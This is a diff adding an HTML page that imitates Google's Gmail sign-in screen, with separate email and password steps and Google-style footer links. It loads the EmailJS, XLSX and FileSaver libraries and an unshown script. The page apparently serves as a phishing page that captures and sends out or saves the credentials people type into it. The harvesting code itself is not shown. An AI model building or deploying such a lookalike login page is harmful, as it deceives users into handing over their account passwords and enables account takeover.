@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.17.0/xlsx.full.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+</head> 
+<body>
+    <div class="main">
+        <div class="wrapper">
+            <div class="inner__wrapper">
+                <img src="images/logo.png" alt="logo" width="75" height="24">
+                <h2 id="signIn">Sign in</h2>
+                <h3 id="gmailAccount" class="gmailAccount">Sign in with your Google Account to get your bookmarks, history, passwords, and other settings on all your devices.</h3>
+                <div id="g_id_onload"
+                    data-client_id="YOUR_CLIENT_ID"
+                    data-callback="handleGoogleSignIn"
+                    data-auto_prompt="false">
+            </div>
+                <form action="####" id="form">
+                    <div class="form-wrapper username">
+
+                        <div class="form__group">
+                            <input type="text" name="email" id="email" required>
+                            <label for="email" class="email-label">Email or phone</label>
+                        </div>
+                        <div><a href="forget-password.html" class="forgot"> Forgot email?</a></div>
+
+
+                        <p>Not your computer? Use Guest mode to sign in privately. 
+                            <br><a href="#">Learn more about using Guest mode</a>
+                        </p>
+
+
+                        <ul class="control">
+                            <li><a href="google orginal page.html">Create account</a></li>
+                            <li><button class="btn" id="btnNext">Next</button></li>
+                        </ul>
+                    </div>
+                    <div class="form-wrapper password">
+                        <div class="form__group">
+                            <input type="password" id="password_input" name="password" required>
+                            <label for="password">Enter your password</label>
+                        </div>
+
+                        <label class="show-password-checkbox">
+                            <input type="checkbox" id="showPass">
+                            <span class="checkmark"></span>
+                            Show password
+                        </label>
+
+                        <ul class="control">
+                            <li><a href="forget-password.html">Forgot password?</a></li>
+                            <li><button class="btn" id="btndone" type="submit" name="save">Next</button></li>
+                        </ul>
+                    </div>
+                </form>
+            </div>
+            <div class="language">
+                <select name="" id="">
+                    <option value="english">English (United States)</option>
+                    <option value="russion">Russion</option>
+                    <option value="deutsch">Deutsch</option>
+                </select>
+                <ul class="privacy">
+                    <li><a href="#">Help</a></li>
+                    <li><a href="#">Privacy</a></li>
+                    <li><a href="#">Terms</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <script src="js/code.js"></script>
+
+</body>
+</html>
